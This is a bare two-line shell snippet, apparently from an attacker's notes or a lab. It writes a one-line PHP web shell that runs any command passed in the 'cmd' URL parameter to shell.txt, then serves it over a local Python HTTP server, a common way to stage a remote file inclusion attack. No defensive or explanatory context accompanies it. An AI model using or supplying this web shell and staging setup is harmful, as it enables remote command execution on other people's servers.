echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 8000
